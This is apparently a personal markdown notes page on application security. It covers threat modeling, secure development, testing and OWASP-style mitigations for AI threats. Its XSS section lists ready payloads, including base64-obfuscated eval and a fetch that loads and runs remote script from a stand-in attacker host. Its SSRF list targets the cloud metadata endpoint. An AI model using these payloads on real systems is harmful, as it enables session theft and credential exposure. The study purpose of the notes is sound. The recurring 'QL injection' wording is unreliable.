# Security Resources

## Table of Contents
- [Security Resources](#security-resources)
  - [Table of Contents](#table-of-contents)
  - [Geospatial Data and Tactical Applications](#geospatial-data-and-tactical-applications)
  - [Secure Communication Tools](#secure-communication-tools)



## Geospatial Data and Tactical Applications
- [Android Team Awareness Kit - geospatial data](https://www.civtak.org/)
- [Android Tactical Assault Kit - GitHub](https://github.com/deptofdefense/AndroidTacticalAssaultKit-CIV)
- [Android Tactical Assault Kit - YouTube](https://youtu.be/yUZowYfDspc?si=3eDWyI7CCgz0KIfn)


&nbsp;  
## Secure Communication Tools
- [Briar - Official Site](https://briarproject.org/)
- [Haven - Mesh Radio](https://buildwithparallel.com/products/haven)
- [Haven - YouTube](https://youtu.be/nWszlmgOdYc?si=6aI87wpfIj1XxKFz)
- [ ](https://youtube.com/watch?v=6QUVzvhEhu4)


&nbsp;  
## ???
https://youtube.com/watch?v=o32i22HNxhc
https://youtube.com/watch?v=0zSKSiJbVqw
https://youtube.com/watch?v=OU0v_G3-4Hw
https://youtube.com/watch?v=u6qKu_PbNIY







## Application Security
### During Requirements Specification
#### CIA triangle
- Confidentiality: preventing the disclosure of information to unauthorized individuals or systems.
- Integrity: maintaining and assuring the accuracy and consistency of data over its entire lifecycle. This means that data cannot be modified in an unauthorized or undetected manner.
- Availability: For any information system to serve its purpose, the information must be available when it is needed. This means that the computing systems used to store and process the information, the security controls used to protect it, and the communication channels used to access it must be functioning correctly.

Additional Security Principles:  
- Authentication: ensure that the data, transactions, communications or documents (electronic or physical) are genuine and that the parties involved are who they claim to be.
- Authorization: The process that governs the resources and operations that the authenticated client is permitted to access. Resources include files, databases, tables, rows, and so on, together with system-level resources such as registry keys and configuration data.
- Audit: Effective auditing and logging is the key to non-repudiation (guarantees that a user cannot deny performing an operation or initiating a transaction). 


#### Threat Modeling - STRIDE
- Spoofing: the impersonatation of an user or process in an unauthorized way. It can stem from cookies manipulation. Spoofing can be prevented by using stringent authentication and keeping credential information safe.  
- Tampering: changing or deleting a resource without authorization (like defacing a webpage or using a script exploit).
- Repudiation: carrying out a transaction in such a way that there is no proof after the fact of the principals involved in the transaction (e.g. impersonation).
- Information Disclosure: stealing or revealing information that is supposed to be private. Use encryption, hashing and authentication to mitigate this risks.
- Denial of Service: A denial of service attack is to deliberately cause an application to be less available than it should be. To prevent this kind of attack you should limit the number of requests, block IPs using white/black lists.
- Elevation of Privilege: it is to use malicious means to get more permissions than normally assigned. Least-privilege principle should be used to mitigate this risk.


#### OWASP & CWE
[Top 10 webapp security risks](https://owasp.org/www-project-top-ten/)  
[2023 CWE TOP 25](https://cwe.mitre.org/top25/archive/2023/2023_top25_list.html#top25list)



### During Functional Specification (Application Threat Modeling)
Threat modeling is an approach for analyzing the security of an application. It is a structured approach that enables you to identify, quantify, and address the security risks associated with an application.

1) Decompose the Application: we need to understand the application and its external interactions. For this effect, we create use-cases, identify entry points, assets, and trust levels. It is used to produce data flow diagrams (DFDs) for the application.
2) Determine and rank threats: We can use categorizations such as STRIDE or ASF to identify threats from both the attacker and defensive perspectives respectively. DFDs help identify potential threat targets, which can be further analyzed using threat trees. The security risk for each threat can be determined using value-based risk models like DREAD or qualitative risk models based on likelihood and impact.
3) Determine countermeasures and mitigation: We need to identify current countermeasures for each threat and sort threats based on their risk ranking. The business impact is integral to determining the risk associated with each threat, it can be assessed as acceptable in some cases and therefore only requires to inform the user of the threat. For other threats, we need to implement mitigation strategies to reduce the risk to an acceptable level.

[Owasp Threat Modeling](https://owasp.org/www-community/Threat_Modeling)



### During Design
#### Secure Code Practice
The secure code practice document and checklist defines a set of general software security coding practices, in a checklist format, that can be integrated into the software development lifecycle. Implementation of these practices will mitigate most common software vulnerabilities.   
[OWASP SCP Guide](https://owasp.org/www-pdf-archive/OWASP_SCP_Quick_Reference_Guide_v2.pdf)


#### Secure Code review
Code review is the systematic examination (often called peer review) of computer source code. It is intended to find and fix mistakes overlooked in the initial development phase, improving the overall quality of software. It is combined with automated tools and manual penetration testing to increase the cost effectiveness of an application security verification effort.  
[OWASP Code Review Guide](https://owasp.org/www-pdf-archive/OWASP_Code_Review_Guide.pdf)


#### Coding Standard
When developing a web application, safeguard and security services must be employed to protect the application from attack. Those services must be flawless, this guidance provides the techniques and practices to achieve that goal.  
[OWASP Developer Guide](https://owasp.org/www-pdf-archive/OWASP_Developer_Guide_v2.pdf)



### During Development
#### Input Validation
- Whitelist: Allow specific files types using a server side control (Client side control is easily bypassed)
- Authenticate and authorize access to file upload and read operations
- Path traversal: Protect against path manipulation, prevents end users from changing the file write/read path (BufferedWriter object is subject to relative path traversal (CWE-22, CWE-23))
- Stream: Use streaming instead of saving to temporary locations when possible.
- Open Source Dependencies: When using open source libraries, ensure no current published vulnerabilities exist in the dependencies you are using.
- Validation: validate the filename and the metadata of the uploaded file
- Limit the size of the filename, the size of the file, the number of them and the directory to which files are uploaded
- Scan all files with antivirus software (ClamAV or [AttachmentScanner](http://www.attachmentscanner.com/))
- Name the files randomly or using a hash instead of by the user’s input.
- Simplify error messages. Remove any directory paths and server configurations from error messages that attackers could use.
- Check the uploaded directory to make sure the read/write/execute user permissions are correct.
- Remove any unnecessary file evaluation
 
[OWASP Input Validation Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html)



#### File Uploads 
A file upload present 4 kinds of security risks that need to be mitigated:
- File metadata attacks: The path and file name can trick an application into copying the file to an unexpected location that could overwrite an important file and cause unexpected behavior. For example, an attacker could use control characters in the filename to trick the system into overwriting an important configuration file.
- File size attacks: An unexpectedly large file (or very small) can cause an application to overload or fail.
- File content attacks: The content of the file can be used to manipulate the behavior of the application.
- File access attacks: The access rules around uploaded files can be misconfigured, resulting in unauthorized access.

[Arbitrary/Unrestricted file uploads](https://www.owasp.org/index.php/Unrestricted_File_Upload)
[File Uploads best practice](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
[CWE Path Manipulation](https://cwe.mitre.org/data/definitions/434.html)

 
#### Cross-Site Scription (XSS)
Cross-Site Scripting attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted websites. Here are the three main types of XSS attacks:
- Stored/Persistent XSS Attacks: Stored attacks are those where the injected script is permanently stored on the target servers, such as in a database, in a message forum, visitor log, comment field, etc. The victim then retrieves the malicious script from the server when it requests the stored information.
- Reflected XSS Attacks: Reflected attacks are those where the injected script is reflected off the web server, such as in an error message, search result, or any other response that includes some or all of the input sent to the server as part of the request. Reflected attacks are delivered to victims via another route, such as in an e-mail message, or on some other website. When a user is tricked into clicking on a malicious link, submitting a specially crafted form, or even just browsing to a malicious site, the injected code travels to the vulnerable web site, which reflects the attack back to the user’s browser. The browser then executes the code because it came from a "trusted" server.
- DOM Based XSS.  


##### XSS payloads
XSS findings are pretty popular Bug Bounty Programs and PenTests, as they are pretty easy to find with significant impacts, especially stored XSS that can be injected by an attacker and then triggered by multiple victims using the targeted application.  
When triggered, the XSS will execute a javascript with the rights of the authenticated user (ie: victim).  
To be executed, the XSS requires an action from the victim such as visiting a page, clicking on a link.  
[CWE-79](https://cwe.mitre.org/data/definitions/79.html)
https://androx47.medium.com/cross-site-scripting-xss-payloads-6a492d795c0


Most popular payloads:  
`<img src onerror=alert(1)>`  
`"><img src onerror=alert(1)>`  
`"autofocus onfocus=alert(1)//`  
`</script><script>alert(1)</script>`  
`'-alert(1)-'`  
`\'-alert(1)//`  
`javascript:alert(1)`  

Payload common examples (Can be used when Fuzzing):
- in HTML:
   - `<img src=x onerror=alert(document.domain) />`
   - `&lt;img src=x onerror=alert(document.domain) /&gt;`
- in RSS Feed: `<link>javascript:alert(document.domain)//</link>`
- in SVG file: `<script type="text/javascript">alert(document.domain);</script>`
- in URL (Reflected XSS): `description=a%22%3e%3csvg%20onload=alert('XSS')%3e`
- Base64 Encoded Payload:
  - `<img src=x onerror=eval(atob("YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="))>`
  - `<img src=x id=YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ== onerror=eval(atob(this.id))>`
- Using a remote JS:
  - `<img src=x onerror=fetch('https://attacker_hosting.script.js').then((r)=>r.text()).then(j=>{eval(j)}); />`
      Note : The Javascript code is externally hosted with Access-Control-Allow-Origin set to *
  - `<img src=x onerror=eval(atob("ZmV0Y2goJ2h0dHBzOi8vYXR0YWNrZXJfaG9zdGluZy5zY3JpcHQuanMnKS50aGVuKChyKT0+ci50ZXh0KCkpLnRoZW4oaj0+e2V2YWwoail9KTs="))>`

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)


##### Prevention
- Both reflected and stored XSS can be addressed by performing the appropriate validation and escaping on the server-side. DOM Based XSS can be addressed with a special subset of rules described in the DOM based XSS Prevention Cheat Sheet
- Perform output encoding/escaping, to make sure the malicious code isn't interpreted when the user-input is displayed
- Don't rely on user-input validation / back-end filtering => Possible issues for customers, and possibility to be bypassed
- No need to implement front-end filtering => Useless protection, as it's easily bypassed by using a web proxy


#### SSRF payload examples
SSRF vulnerabilities let an attacker send crafted requests from the back-end server of a vulnerable application. Criminals usually use SSRF attacks to target internal systems that are behind firewalls and are not accessible from the external network. An attacker may also leverage SSRF to access services available through the loopback interface (127.0.0.1) of the exploited server.  
[CWE-918](https://cwe.mitre.org/data/definitions/918.html)
[Acunetix](https://www.acunetix.com/blog/articles/server-side-request-forgery-vulnerability/)
[Mitigations](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)

Most popular payloads:  
- <https://127.0.0.1:[port]>
- <https://localtest.me:[port]>
- <http://169.254.169.254/latest/meta-data/>
- <http://169.254.169.254.nip.io>  (if on AWS)
[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md)


#### DLL Hijacking
- Make sure to only import used DLL and functions.
- Specify the exact location of all associated DLL files to prevent Windows from defaulting to its DLL search path protocol.
- Verify all DLLs before loading them (e.g. by checking their signatures)
See also : [Effective Strategies for Protecting Against DLL Hijacking](https://www.linkedin.com/pulse/effective-strategies-protecting-against-dll-hijacking-towfik-alrazihi-nc4ke)
Associated CWE : https://cwe.mitre.org/data/definitions/427.html

 
#### COM Hijacking
There is no way to prevent such attack from the application.  
This type of attack technique cannot be easily mitigated with preventive controls since it is based on the abuse of system features. (https://attack.mitre.org/techniques/T1546/015/)  
Mitigation can only be done at the OS level via Policies, EDR/monitoring tools.  




### Verification
Static application security testing (SAST) is a set of technologies designed to analyze application source code, byte code and binaries for coding and design conditions that are indicative of security vulnerabilities. SAST solutions analyze an application from the “inside out”.  

**Tools**
- VERACODE: Scan automatically service level code during development time to find vulnerabilities in source code.
- QL Injection / Java source code. An QL injection attack consists of insertion or "injection" of an QL command via the input data from the client to the application. A successful QL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute administration operations on the system, and in some cases issue commands to the operating system. QL injection flaws are introduced when software developers create dynamic commands that include user supplied input. Use of parameterized QL commands allow the developer to first define the QL command, and then pass in each parameter to the command later. This coding style allows distinguishing between code and data, regardless of what user input is supplied. Parameterized commands ensure that an attacker is not able to change the intent of a query, even if QL commands are inserted by an attacker. 



### Validation
**The use of customer data for any form of system, application, or product testing is prohibited. Testing activities should be performed with synthetic, anonymized, or otherwise non-identifiable data that cannot be traced back to an individual customer.**  

Using OWASP ZAP Dynamic Application Security Testing tool:
1) Turn on specific Scan Policy (All vulnerabilities).
2) Enable all existing security controls on your server.
3) Run your app’s automated test suite.
4) Initiate OWASP ZAP on recorded requests.
5) Find vulnerabilities and Analyze alerts.

[OWASP Application Security Verification Standard (ASVS)](https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project#tab=Downloads)
[OWASP Testing Guide](https://www.owasp.org/index.php/OWASP_Testing_Project)



### Qualification
In-production vulnerabilities discovery, Security Assessment for Production vulnerabilities (RCA), Customers Security reported vulnerabilities, customer PenTests, Threat Intelligence Sources (Internal/External).  

#### Penetration Tests (Security Audit)
A penetration test, is an authorized simulated cyberattack on a computer system, performed to evaluate the security of the system. The test is performed to identify both weaknesses (also referred to as vulnerabilities), including the potential for unauthorized parties to gain access to the system's features and data, as well as strengths, enabling a full risk assessment to be completed.
Pentesters: XMCO, Almond Consulting, Synacktiv  


#### Vulnerability Scans (CLOUD)
Find Service Vulnerabilities and Misconfigurations, mainly at Network, middleware and OS levels, to assess security continuously from development to production. Host-based scans are used to locate and identify vulnerabilities, misconfigurations and missing patches in servers, workstations or other network hosts. This type of scan usually examines ports and services in an authenticated mode.  
Use Nessus/Rapid7/Nexpose, or similar, scans IPv4/IPv6/hybrid networks, credentialed scanning for system misconfigurations & missing patches.  


#### Threat Intelligence
Any information related to a threat that might help an organization protect itself against a threat or detect the activities of an actor. Major types of threat information include indicators, TTPs, security alerts, threat intelligence reports, and tool configurations (NIST). 
Dedicated tools: IntSights, Anomali, Feeders, News, Security Researcher, or any other valid source of information.  




&nbsp;  
&nbsp;  
### AI Threats & Mitigations
#### Prompt Injection
Manipulating user inputs to make models generate harmful or unintended behaviors, compromising system security. [CWE-1427](https://cwe.mitre.org/data/definitions/1427.html)  

**Mitigations**  
- Constrain model behavior: Provide specific instructions about the model’s role, capabilities, and limitations within the system prompt. Enforce strict context adherence, limit responses to specific tasks or topics, and instruct the model to ignore attempts to modify core instructions.	[LLM01:2025](https://genai.owasp.org/llmrisk/llm01-prompt-injection/)
- Implement input filtering: Define sensitive categories and construct rules for identifying and handling such content. Apply semantic filters and use string-checking to scan for non-allowed content. [LLM01:2025](https://genai.owasp.org/llmrisk/llm01-prompt-injection/)
- Enforce privilege control and least privilege access: Provide the application with its own API tokens for extensible functionality, and handle these functions in code rather than providing them to the model. Restrict the model’s access privileges to the minimum necessary for its intended operations. [LLM01:2025](https://genai.owasp.org/llmrisk/llm01-prompt-injection/)
- Require human approval for high-risk actions: Implement human-in-the-loop controls for privileged operations to prevent unauthorized actions. [LLM01:2025](https://genai.owasp.org/llmrisk/llm01-prompt-injection/)
- Segregate and identify external content: Separate and clearly denote untrusted content to limit its influence on user prompts. For instance, use a Chat Markup Language (ChatML). [LLM01:2025](https://genai.owasp.org/llmrisk/llm01-prompt-injection/)
- Generative AI Guardrails on Inputs:	Guardrails are safety controls that are placed between a generative AI model and the output shared with the user to prevent undesired inputs and outputs. Guardrails can take the form of validators such as filters, rule-based logic, or regular expressions, as well as AI-based approaches, such as classifiers and utilizing LLMs, or named entity recognition (NER) to evaluate the safety of the prompt or response. Domain specific methods can be employed to reduce risks in a variety of areas such as etiquette, brand damage, jailbreaking, false information, code exploits, SQL injections, and data leakage. [AML.M0020](https://atlas.mitre.org/mitigations/AML.M0020)
- Generative AI Guidelines: Guidelines are safety controls that are placed between user-provided input and a generative AI model to help direct the model to produce desired outputs and prevent undesired outputs.
  Guidelines can be implemented as instructions appended to all user prompts or as part of the instructions in the system prompt. They can define the goal(s), role, and voice of the system, as well as outline safety and security parameters.
  Example : use of prefix with Mistral LLM
  [AML.M0021](https://atlas.mitre.org/mitigations/AML.M0021)
- Generative AI Model Alignment: When training or fine-tuning a generative AI model it is important to utilize techniques that improve model alignment with safety, security, and content policies.
  The fine-tuning process can potentially remove built-in safety mechanisms in a generative AI model, but utilizing techniques such as Supervised Fine-Tuning, Reinforcement Learning from Human Feedback or AI Feedback, and Targeted Safety Context Distillation can improve the safety and alignment of the model.
  [AML.M0022](https://atlas.mitre.org/mitigations/AML.M0022)


#### Sensitive Information Disclosure
Reveal sensitive information, proprietary algorithms, or other confidential details.

**Mitigations**
- Integrate data sanitization techniques: Scrub/mask sensitive content before training or inference to prevent leakage into models. [LLM02:2025](https://genai.owasp.org/llmrisk/llm02-sensitive-information-disclosure/)
- Robust input validation: Detect and filter potentially harmful or sensitive inputs. [LLM02:2025](https://genai.owasp.org/llmrisk/llm02-sensitive-information-disclosure/)
- Enforce strict access controls: Apply least privilege for all data access. [LLM02:2025](https://genai.owasp.org/llmrisk/llm02-sensitive-information-disclosure/)
- Restrict data sources: Limit and securely orchestrate access to external data. [LLM02:2025](https://genai.owasp.org/llmrisk/llm02-sensitive-information-disclosure/)
- Utilize federated learning: Train on decentralized data to minimize exposure. [LLM02:2025](https://genai.owasp.org/llmrisk/llm02-sensitive-information-disclosure/)
- Incorporate differential privacy: Add calibrated noise to protect individuals. [LLM02:2025](https://genai.owasp.org/llmrisk/llm02-sensitive-information-disclosure/)
- Homomorphic encryption: Process data while encrypted to preserve confidentiality. [LLM02:2025](https://genai.owasp.org/llmrisk/llm02-sensitive-information-disclosure/)
- Tokenization and redaction: Detect and redact sensitive content before processing. [LLM02:2025](https://genai.owasp.org/llmrisk/llm02-sensitive-information-disclosure/)
- Generative AI guardrails: Use filters, rules, and classifiers to reduce leakage and harmful content. [AML.M0020](https://atlas.mitre.org/mitigations/AML.M0020)
- Generative AI guidelines: Enforce safety/security instructions in the system prompt or prefixed to user input. [AML.M0021](https://atlas.mitre.org/mitigations/AML.M0021)
- Generative AI model alignment: Use SFT, RLHF/RLAIF, and targeted safety distillation. [AML.M0022](https://atlas.mitre.org/mitigations/AML.M0022)


#### Supply Chain Vulnerabilities
Vulnerabilities from software, pre-trained models, and training data supplied by third parties.

**Mitigations**
- Validate third‑party models and datasets: Vet suppliers, terms, and privacy policies; use trusted sources. [LLM05:2025](https://genai.owasp.org/llmrisk/llm05-supply-chain-vulnerabilities/)
- Validate and verify data/model integrity: Use cryptographic checksums and hashes. [LLM05:2025](https://genai.owasp.org/llmrisk/llm05-supply-chain-vulnerabilities/) [AML.M0014](https://atlas.mitre.org/mitigations/AML.M0014)
- Use signed and verified models: Enforce code signing and provenance checks. [LLM05:2025](https://genai.owasp.org/llmrisk/llm05-supply-chain-vulnerabilities/) [AML.M0013](https://atlas.mitre.org/mitigations/AML.M0013)
- Monitor and patch third‑party dependencies: Continuously assess, patch, and track versions. [LLM05:2025](https://genai.owasp.org/llmrisk/llm05-supply-chain-vulnerabilities/)
- Implement generative AI guardrails: Add input/output validators to mitigate injected exploits and leakage. [AML.M0020](https://atlas.mitre.org/mitigations/AML.M0020)


#### Data & Model Poisoning
Inserting malicious or misleading data into training/fine‑tuning to degrade performance or compromise security.

**Mitigations**
- Maintain AI dataset provenance: Track source and full modification history. [AML.M0025](https://atlas.mitre.org/mitigations/AML.M0025)
- Detect anomalies during training/fine‑tuning: Monitor losses/metrics and flag abnormal behaviors. [LLM04:2025](https://genai.owasp.org/llmrisk/llm04-data-and-model-poisoning/)
- Sanitize training data: Filter, validate, and cleanse datasets continuously. [AML.M0007](https://atlas.mitre.org/mitigations/AML.M0007)


#### Improper Output Handling
Occurs when model outputs are not properly validated or sanitized, leading to risks like XSS, data leakage, or unauthorized actions. [CWE-1426](https://cwe.mitre.org/data/definitions/1426.html)

**Mitigations**
- Define and validate expected output formats: Specify schemas and enforce adherence deterministically. [LLM05:2025](https://genai.owasp.org/llmrisk/llm05-improper-output-handling/)
- Implement output filtering: Screen for sensitive categories and validate groundedness (RAG Triad). [LLM05:2025](https://genai.owasp.org/llmrisk/llm05-improper-output-handling/)
- Implement zero‑trust approach: Treat the model like an untrusted user and validate all outputs before backend use. [LLM05:2025](https://genai.owasp.org/llmrisk/llm05-improper-output-handling/)
- Implement output encoding: Apply context‑aware encoding (HTML, SQL, etc.). [LLM05:2025](https://genai.owasp.org/llmrisk/llm05-improper-output-handling/)
- Generative AI guardrails on outputs: Use rule‑based and ML filters/classifiers before returning content. [AML.M0020](https://atlas.mitre.org/mitigations/AML.M0020)
- Implement passive ML output obfuscation: Reduce fidelity of outputs where appropriate. [AML.M0002](https://atlas.mitre.org/mitigations/AML.M0002)


#### Excessive Agency
Automated agents perform unauthorized or harmful actions due to overly broad capabilities.

**Mitigations**
- Minimize functionalities: Expose only narrowly scoped functions. [LLM06:2025](https://genai.owasp.org/llmrisk/llm06-excessive-agency/)
- Avoid open‑ended extensions: Prefer granular, purpose‑built tools over shell/URL fetch primitives. [LLM06:2025](https://genai.owasp.org/llmrisk/llm06-excessive-agency/)
- Minimize permissions: Enforce RBAC and least privilege for agent capabilities. [LLM06:2025](https://genai.owasp.org/llmrisk/llm06-excessive-agency/)
- Execute extensions in user’s context: Act with the user’s auth and minimal scopes. [LLM06:2025](https://genai.owasp.org/llmrisk/llm06-excessive-agency/)
- Require user approval: Add human‑in‑the‑loop for high‑impact operations. [LLM06:2025](https://genai.owasp.org/llmrisk/llm06-excessive-agency/)


#### System Prompt Leakage
Internal system prompts or configurations are exposed, enabling manipulation or misuse.

**Mitigations**
- Separate sensitive data from system prompts: Do not embed secrets/roles/DB names; externalize them. [LLM07:2025](https://genai.owasp.org/llmrisk/llm07-system-prompt-leakage/)
- Avoid reliance on system prompts for strict control: Enforce safety and authorization outside the model. [LLM07:2025](https://genai.owasp.org/llmrisk/llm07-system-prompt-leakage/)
- Generative AI guardrails: Place safety controls between user/model and model/user. [AML.M0020](https://atlas.mitre.org/mitigations/AML.M0020)
- Enforce controls independently of the model: Authorization and privilege checks must be deterministic and auditable. [LLM07:2025](https://genai.owasp.org/llmrisk/llm07-system-prompt-leakage/)


#### Vector and Embedding Weaknesses
Manipulation of embeddings/vectors can cause incorrect associations, bias, or leakage.

**Mitigations**
- Enforce permission and access control: Fine‑grained, permission‑aware vector stores with strict partitioning. [LLM08:2025](https://genai.owasp.org/llmrisk/llm08-vector-and-embedding-weaknesses/)
- Data validation and source authentication: Validate sources and audit the knowledge base for hidden code/poisoning. [LLM08:2025](https://genai.owasp.org/llmrisk/llm08-vector-and-embedding-weaknesses/)
- Data review for combination and classification: Tag/classify to enforce access levels and prevent mismatches. [LLM08:2025](https://genai.owasp.org/llmrisk/llm08-vector-and-embedding-weaknesses/)


#### Misinformation
Model produces erroneous information and presents it authoritatively.

**Mitigations**
- Retrieval‑Augmented Generation (RAG): Retrieve from trusted sources during generation. [LLM09:2025](https://genai.owasp.org/llmrisk/llm09-misinformation/)
- Model fine‑tuning/embeddings: Use PET and reasoning prompts to improve quality. [LLM09:2025](https://genai.owasp.org/llmrisk/llm09-misinformation/)
- Cross‑verification and human oversight: Fact‑check critical outputs; train reviewers. [LLM09:2025](https://genai.owasp.org/llmrisk/llm09-misinformation/)
- Automatic validation mechanisms: Programmatically validate high‑stakes outputs. [LLM09:2025](https://genai.owasp.org/llmrisk/llm09-misinformation/)
- Risk communication and UI design: Label AI content, disclose limitations, and guide responsible use. [LLM09:2025](https://genai.owasp.org/llmrisk/llm09-misinformation/)


#### Unbounded Consumption
Methods that consume excessive resources cause DoS or enable model extraction.

**Mitigations**
- Input validation: Enforce strict size/shape limits. [LLM10:2025](https://genai.owasp.org/llmrisk/llm10-unbounded-consumption/)
- Adversarial input detection: Block atypical/malicious patterns and IPs. [AML.M0015](https://atlas.mitre.org/mitigations/AML.M0015)
- Limit exposure of logits/logprobs: Avoid unnecessary probability disclosures. [LLM10:2025](https://genai.owasp.org/llmrisk/llm10-unbounded-consumption/)
- Rate limiting and quotas: Restrict request rates and totals per entity. [LLM10:2025](https://genai.owasp.org/llmrisk/llm10-unbounded-consumption/) [AML.M0004](https://atlas.mitre.org/mitigations/AML.M0004)
- Resource allocation management: Dynamically cap per‑request/user resources. [LLM10:2025](https://genai.owasp.org/llmrisk/llm10-unbounded-consumption/)
- Timeouts and throttling: Bound processing time for heavy operations. [LLM10:2025](https://genai.owasp.org/llmrisk/llm10-unbounded-consumption/)
- Sandbox techniques: Restrict network/internal service/API access. [LLM10:2025](https://genai.owasp.org/llmrisk/llm10-unbounded-consumption/)
- Watermarking: Embed/detect unauthorized use of outputs. [LLM10:2025](https://genai.owasp.org/llmrisk/llm10-unbounded-consumption/)


#### Model Theft
Unauthorized access and exfiltration of models.

**Mitigations**
- Control access to ML models and data at rest: Protect registries and restrict training data access. [AML.M0005](https://atlas.mitre.org/mitigations/AML.M0005)
- Watermarking: Detect unauthorized model/content reuse. [LLM10:2025](https://genai.owasp.org/llmrisk/llm10-unbounded-consumption/)
- Encrypt sensitive information: Encrypt models and related artifacts. [AML.M0012](https://atlas.mitre.org/mitigations/AML.M0012)

